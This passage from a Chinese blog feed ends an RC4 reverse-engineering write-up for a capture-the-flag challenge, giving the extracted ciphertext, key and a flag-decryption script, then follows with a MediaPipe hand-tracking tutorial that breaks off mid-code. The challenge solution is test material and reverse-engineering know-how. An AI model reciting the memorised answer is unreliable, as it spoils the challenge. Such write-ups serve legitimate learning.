class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>n <span class="token comment">#这里n取256</span>    然后交换s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    i<span class="token operator">+=</span><span class="token number">1</span><span class="token comment">#至于为啥要这么做 我的理解就是打乱s表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第三步伪随机密钥生成</p><pre class="line-numbers language-none"><code class="language-none">i&#x3D;j&#x3D;k&#x3D;0for w in range(len(明文长度))    i&#x3D;(i+1)%n    j&#x3D;(j+S[i])%n    交换S[i],S[j]    随机值在S表中的序号:k&#x3D; (s[i]+s[j])%n    取得迭代值:R&#x3D;S[k]    最后与明文单位xor就行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>解密的时候就很简单了</p><p>重复上次过程只把明文换成密码在xor就行了</p><p>这里注意的是要,用ascii码值来进行操作</p></blockquote><p>三步完成</p><h2 id="以绿城杯-warmup-easy-re来说"><a href="#以绿城杯-warmup-easy-re来说" class="headerlink" title="以绿城杯[warmup]easy_re来说"></a>以绿城杯[warmup]easy_re来说</h2><p>首先查壳,没有发现 看到是32位的 </p><p>打开后 f5 不了 </p><p><img src="https://img-blog.csdnimg.cn/98b774199abf4db1b0f4df1e10c89be9.png" alt="请添加图片描述"></p><p>看到 开头有个花指令</p><p>给nop掉就行了</p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20211009100514837.png" alt="image-20211009100514837" style="zoom:50%;" /><p>然后按c 将其转换为代码就行了</p><p>得到主代码</p><p>根据上面所的rc4特征一眼就可以看出来</p><p>不过这里改了一点地方,问题不大我们代码跟着跑一遍,最后xor一下就行了</p><blockquote><p>首先找密文</p></blockquote><p>看到v18-v21是连续的     v17 v18点进去   然后 shift +e 复制出来 再加上v19 v20v21 拼接出来就行了</p><p>这里注意是小端存储所以要从后面读</p><p>找到密文</p><pre class="line-numbers language-none"><code class="language-none">enc&#x3D;&#39;F58C8DE49FA5286530F4EBD324A9911A6FD46AD70B8DE8B8834A5A6EBECBF44B99D6E6547A4F5014&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据特征找到v25就是key</p><pre class="line-numbers language-none"><code class="language-none">key&#x3D;&#39;tallmewhy&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后跟着写一遍最后xor就行了</p><p>贴一下脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'F58C8DE49FA5286530F4EBD324A9911A6FD46AD70B8DE8B8834A5A6EBECBF44B99D6E6547A4F5014E5EC'</span>enc_flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc_flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v24<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">256</span>Dst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">256</span>key<span class="token operator">=</span><span class="token string">'tallmewhy'</span>key_<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>    key_<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>v6<span class="token operator">=</span><span class="token number">0</span>v5<span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment">#初始化</span><span class="token keyword">for</span> v6 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Dst<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token operator">=</span>v6    v24<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token operator">=</span> key_<span class="token punctuation">[</span>v6<span class="token operator">%</span>v5<span class="token punctuation">]</span>v7<span class="token operator">=</span><span class="token number">0</span>v8<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> v7 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v9<span class="token operator">=</span>Dst<span class="token punctuation">[</span>v7<span class="token punctuation">]</span>    v8<span class="token operator">=</span><span class="token punctuation">(</span>v8<span class="token operator">+</span>v24<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token operator">+</span>v9<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span>    Dst<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token operator">=</span>Dst<span class="token punctuation">[</span>v8<span class="token punctuation">]</span>    v7<span class="token operator">+=</span><span class="token number">1</span>    Dst<span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token operator">=</span>v9<span class="token operator">^</span><span class="token number">0x37</span>v10 <span class="token operator">=</span> <span class="token number">0</span>v22 <span class="token operator">=</span> <span class="token number">0</span>v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#print(len(enc_flag))</span><span class="token keyword">for</span>  w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v10<span class="token operator">=</span><span class="token punctuation">(</span>v10<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span>    v12<span class="token operator">=</span> Dst<span class="token punctuation">[</span>v10<span class="token punctuation">]</span>    v11<span class="token operator">=</span> <span class="token punctuation">(</span>v12<span class="token operator">+</span>v11<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span>    Dst<span class="token punctuation">[</span>v10<span class="token punctuation">]</span><span class="token operator">=</span> Dst<span class="token punctuation">[</span>v11<span class="token punctuation">]</span>    Dst<span class="token punctuation">[</span>v11<span class="token punctuation">]</span><span class="token operator">=</span>v12    t<span class="token operator">=</span> <span class="token punctuation">(</span>Dst<span class="token punctuation">[</span>v10<span class="token punctuation">]</span><span class="token operator">+</span>Dst<span class="token punctuation">[</span>v11<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span>    R<span class="token operator">=</span> Dst<span class="token punctuation">[</span>t<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>R<span class="token operator">^</span>enc_flag<span class="token punctuation">[</span>w<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/c1317cc58ff947e48c318dce58cccdd6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>嘿嘿</title>
      <link href="/2021/10/07/shou-bu-shi-bie/"/>
      <url>/2021/10/07/shou-bu-shi-bie/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>今天学习了一个非常神奇的手部识别模块mediapipe,只是其中一个功能还有很多功能以后有时间再去学习</p></blockquote><p><img src="https://img-blog.csdnimg.cn/ffde9a8c46264e5db2e4d1b7b095ef2a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p><p>效果如图</p><p>在这里做一下记录</p><h3 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h3><p>首先呢我们先安装必要的模块</p><pre class="line-numbers language-none"><code class="language-none">mediapipeopencv-python  &#x3D;&gt;cv2  我们用的工具时pycharm  直接在那个模块下点加号搜索其模块安装就行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>好了 安装好了之后就开始用了</p><p>首先是</p><pre class="line-numbers language-none"><code class="language-none">cap&#x3D; cv2.VideoCapture()参数是0的话表示打开笔记本的内置摄像头,参数是视频文件路径则打开视频 返回一个对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有了对象之后就可以按帧来读了</p><pre class="line-numbers language-none"><code class="language-none">success,img&#x3D; cap.read() 读取图像帧 有两个返回值,第一个是是否读取成功,第二个是每一帧的图像<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再就是cv2.waitKey()用法</p><pre class="line-numbers language-none"><code class="language-none">参数是1，表示延时1ms切换到下一帧图像,对于视频而言参数为0，如cv2.waitKey(0)只显示当前帧图像，相当于视频暂停<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>今天的主角是这个</p><pre class="line-numbers language-none"><code class="language-none">生成手部对象，注意的是,在后面处理的是RGB格式图像 所以使用 hands.process()处理的图像必须是RGB格式myHands&#x3D; mediapipe.soultions.handshands&#x3D; myHands.Hands()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当然也离不开画图模块</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#对产生的result.multi_hand_landmarks标志物进行连接</span>   mpDraw <span class="token operator">=</span> mediapipe<span class="token punctuation">.</span>soultions<span class="token punctuation">.</span>drawing_utils   img_R<span class="token operator">=</span>  cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>COLOR_BGR2RGB<span class="token punctuation">)</span>   result <span class="token operator">=</span> hands<span class="token punctuation">.</span>process<span class="token punctuation">(</span>img_R<span class="token punctuation">)</span>   <span class="token comment">#result.multi_hand_landmarks是检测到所有手的列表，对该列表进行访问我们可以得到每只手对应标志位的信息</span>    <span class="token keyword">for</span> handLms <span class="token keyword">in</span>  result<span class="token punctuation">.</span>multi_hand_landmarks<span class="token punctuation">:</span>     mpDraw<span class="token punctuation">.</span>draw_landmarks<span class="token punctuation">(</span>img<span class="token punctuation">,</span> handLms<span class="token punctuation">,</span> myHands<span class="token punctuation">.</span>HAND_CONNECTIONS<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以用cv2.putText()方法进行标记</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cv2<span class="token punctuation">.</span>putText<span class="token punctuation">(</span>img<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>cx <span class="token punctuation">,</span> cy <span class="token punctuation">)</span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>FONT_HERSHEY_PLAIN<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>贴大佬的解释参数：image<span class="token punctuation">:</span>它是要在其上绘制文本的图像。text<span class="token punctuation">:</span>要绘制的文本字符串。org<span class="token punctuation">:</span>它是图像中文本字符串左下角的坐标。坐标表示为两个值的元组，即<span class="token punctuation">(</span>X坐标值，Y坐标值<span class="token punctuation">)</span>。font<span class="token punctuation">:</span>它表示字体类型。一些字体类型是FONT_HERSHEY_SIMPLEX，FONT_HERSHEY_PLAIN，等fontScale<span class="token punctuation">:</span>字体比例因子乘以font<span class="token operator">-</span>specific基本大小。color<span class="token punctuation">:</span>它是要绘制的文本字符串的颜色。对于BGR，我们通过一个元组。例如：<span class="token punctuation">(</span><span class="token number">255</span>，<span class="token number">0</span>，<span class="token number">0</span><span class="token punctuation">)</span>为蓝色。thickness<span class="token punctuation">:</span>它是线的粗细像素。lineType<span class="token punctuation">:</span>这是一个可选参数，它给出了要使用的行的类型。bottomLeftOrigin<span class="token punctuation">:</span>这是一个可选参数。如果为true，则图像数据原点位于左下角。否则，它位于左上角。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/f6e460f560e64fb0b21de581747118a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_17,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p><p>相关代码为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  cv2<span class="token keyword">import</span>  mediapipe <span class="token keyword">as</span> mp<span class="token keyword">import</span> time<span class="token comment">#视频操作函数</span><span class="token comment">#也可以导入视频</span>cap <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#手部跟踪  处理的事RGB格式 所以使用 hands.process()处理的图像必须是RGB格式</span>myHands<span class="token operator">=</span> mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>handshands<span class="token operator">=</span> myHands<span class="token punctuation">.</span>Hands<span class="token punctuation">(</span><span class="token punctuation">)</span>mpDraw <span class="token operator">=</span> mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>drawing_utilspTime <span class="token operator">=</span> <span class="token number">0</span>cTime <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment">#读取摄像头每一帧并显示</span>    success<span class="token punctuation">,</span>img<span class="token operator">=</span> cap<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">"image"</span><span class="token punctuation">,</span>img<span class="token punctuation">)</span>    <span class="token comment">#必须是RGB格式 而得到的图像默认是BGR格式所以要转</span>    img_R<span class="token operator">=</span>  cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>COLOR_BGR2RGB<span class="token punctuation">)</span>    result <span class="token operator">=</span> hands<span class="token punctuation">.</span>process<span class="token punctuation">(</span>img_R<span class="token punctuation">)</span>    <span class="token comment">#检测所有手的列表,对列表进行访问可以获得 手的位置信息</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>multi_hand_landmarks<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> handLms <span class="token keyword">in</span>  result<span class="token punctuation">.</span>multi_hand_landmarks<span class="token punctuation">:</span>            <span class="token comment">#每一个标志位都有一个id 获取并将其显示</span>            <span class="token keyword">for</span> <span class="token builtin">id</span><span class="token punctuation">,</span>lm <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>handLms<span class="token punctuation">.</span>landmark<span class="token punctuation">)</span><span class="token punctuation">:</span>                h<span class="token punctuation">,</span> w<span class="token punctuation">,</span> c <span class="token operator">=</span> img<span class="token punctuation">.</span>shape                <span class="token comment">#获取界面中的坐标 ,这里经过测试是获取的小数需要*界面获取真正坐标</span>                cx<span class="token punctuation">,</span> cy <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>x<span class="token operator">*</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>y<span class="token operator">*</span>h<span class="token punctuation">)</span>                cv2<span class="token punctuation">.</span>putText<span class="token punctuation">(</span>img<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>cx <span class="token punctuation">,</span> cy <span class="token punctuation">)</span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>FONT_HERSHEY_PLAIN<span class="token punctuation">,</span>                            <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">"Image"</span><span class="token punctuation">,</span> img<span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">换成mpDraw.draw_landmarks(img, handLms, mpHands.HAND_CONNECTIONS)就成了一开始图片的结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当然也可以加</p><p>fps</p><pre class="line-numbers language-none"><code class="language-none">操作为 cTime &#x3D; time.time()    fps &#x3D; 1 &#x2F; (cTime - pTime)    pTime &#x3D; cTime    cv2.putText(img, str(int(fps)), (10, 70), cv2.FONT_HERSHEY_PLAIN, 3,                (255, 0, 255), 3)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以最后效果为</p><p><img src="https://img-blog.csdnimg.cn/edebb1e6078a4ecf9b19b0181afd48a8.png" alt="请添加图片描述"><br>贴一下写的代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  cv2<span class="token keyword">import</span>  mediapipe <span class="token keyword">as</span> mp<span class="token keyword">import</span> time<span class="token comment">#视频操作函数</span><span class="token comment">#也可以导入视频</span>cap <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#手部跟踪  处理的事RGB格式 所以使用 hands.process()处理的图像必须是RGB格式</span>myHands<span class="token operator">=</span> mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>handshands<span class="token operator">=</span> myHands<span class="token punctuation">.</span>Hands<span class="token punctuation">(</span><span class="token punctuation">)</span>mpDraw <span class="token operator">=</span> mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>drawing_utilspTime <span class="token operator">=</span> <span class="token number">0</span>cTime <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment">#读取摄像头每一帧并显示</span>    success<span class="token punctuation">,</span>img<span class="token operator">=</span> cap<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">"image"</span><span class="token punctuation">,</span>img<span class="token punctuation">)</span>    img_R<span class="token operator">=</span>  cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>COLOR_BGR2RGB<span class="token punctuation">)</span>    result <span class="token operator">=</span> hands<span class="token punctuation">.</span>process<span class="token punctuation">(</span>img_R<span class="token punctuation">)</span>    <span class="token comment">#检测所有手的列表,对列表进行访问可以获得 手的位置信息</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>multi_hand_landmarks<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> handLms <span class="token keyword">in</span>  result<span class="token punctuation">.</span>multi_hand_landmarks<span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token builtin">id</span><span class="token punctuation">,</span>lm <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>handLms<span class="token punctuation">.</span>landmark<span class="token punctuation">)</span><span class="token punctuation">:</span>                h<span class="token punctuation">,</span> w<span class="token punctuation">,</span> c <span class="token operator">=</span> img<span class="token punctuation">.</span>shape                <span class="token comment">#获取界面中的坐标</span>                cx<span class="token punctuation">,</span> cy <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>x<span class="token operator">*</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>y<span class="token operator">*</span>h<span class="token punctuation">)</span>                <span class="token comment">#cv2.putText(img, str(int(id)), (cx , cy ), cv2.FONT_HERSHEY_PLAIN,</span>                <span class="token comment">#            1, (0, 0, 255), 2)</span>                <span class="token comment">#mpDraw.draw_landmarks(img, handLms, myHands.HAND_CONNECTIONS)</span>                <span class="token comment">#然后进行画图</span>            mpDraw<span class="token punctuation">.</span>draw_landmarks<span class="token punctuation">(</span>img<span class="token punctuation">,</span> handLms<span class="token punctuation">,</span> myHands<span class="token punctuation">.</span>HAND_CONNECTIONS<span class="token punctuation">)</span>    cTime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    fps <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">/</span> <span class="token punctuation">(</span>cTime <span class="token operator">-</span> pTime<span class="token punctuation">)</span>    pTime <span class="token operator">=</span> cTime    cv2<span class="token punctuation">.</span>putText<span class="token punctuation">(</span>img<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>fps<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>FONT_HERSHEY_PLAIN<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span><span class="token string">"Image"</span><span class="token punctuation">,</span> img<span class="token punctuation">)</span>    cv2<span class="token punctuation">.</span>waitKey<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>最后的总结是:太神奇了,学到了模块的一小部分,就可以实现这个,还有更多东西需要学习.</p></blockquote><p>最后贴一下 模块化代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''手部跟踪模块author:rgylin'''</span><span class="token keyword">import</span> cv2<span class="token keyword">import</span>  mediapipe <span class="token keyword">as</span> mp<span class="token keyword">import</span>  time<span class="token keyword">class</span> <span class="token class-name">handDetector</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>mpHands<span class="token operator">=</span> mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>hands        self<span class="token punctuation">.</span>hands <span class="token operator">=</span> self<span class="token punctuation">.</span>mpHands<span class="token punctuation">.</span>Hands<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>mpDraw <span class="token operator">=</span>mp<span class="token punctuation">.</span>solutions<span class="token punctuation">.</span>drawing_utils    <span class="token keyword">def</span> <span class="token function">findHands</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>img<span class="token punctuation">,</span>draw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        imgR <span class="token operator">=</span>cv2<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>COLOR_BGR2RGB<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>results <span class="token operator">=</span> self<span class="token punctuation">.</span>hands<span class="token punctuation">.</span>process<span class="token punctuation">(</span>imgR<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>results<span class="token punctuation">.</span>multi_hand_landmarks<span class="token punctuation">:</span>            <span class="token keyword">for</span> handLandM <span class="token keyword">in</span>  self<span class="token punctuation">.</span>results<span class="token punctuation">.</span>multi_hand_landmarks<span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>draw<span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>mpDraw<span class="token punctuation">.</span>draw_landmarks<span class="token punctuation">(</span>img<span class="token punctuation">,</span>handLandM<span class="token punctuation">,</span>self<span class="token punctuation">.</span>mpHands<span class="token punctuation">.</span>HAND_CONNECTIONS<span class="token punctuation">)</span>        <span class="token keyword">return</span>  img    <span class="token keyword">def</span> <span class="token function">findPos</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>img<span class="token punctuation">,</span>draw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        imList<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>results<span class="token punctuation">.</span>multi_hand_landmarks<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> handLandMark <span class="token keyword">in</span> self<span class="token punctuation">.</span>results<span class="token punctuation">.</span>multi_hand_landmarks<span class="token punctuation">:</span>                    <span class="token keyword">for</span> <span class="token builtin">id</span><span class="token punctuation">,</span>lm <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>handLandMark<span class="token punctuation">.</span>landmark<span class="token punctuation">)</span><span class="token punctuation">:</span>                        h<span class="token punctuation">,</span>w<span class="token punctuation">,</span>c<span class="token operator">=</span> img<span class="token punctuation">.</span>shape                        X<span class="token punctuation">,</span>Y<span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>x<span class="token operator">*</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>lm<span class="token punctuation">.</span>y<span class="token operator">*</span>h<span class="token punctuation">)</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>draw<span class="token punctuation">)</span><span class="token punctuation">:</span>                            cv2<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>cv2<span class="token punctuation">.</span>FILLED<span class="token punctuation">)</span>        <span class="token keyword">return</span> imList<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pTime <span class="token operator">=</span><span class="token number">0</span>    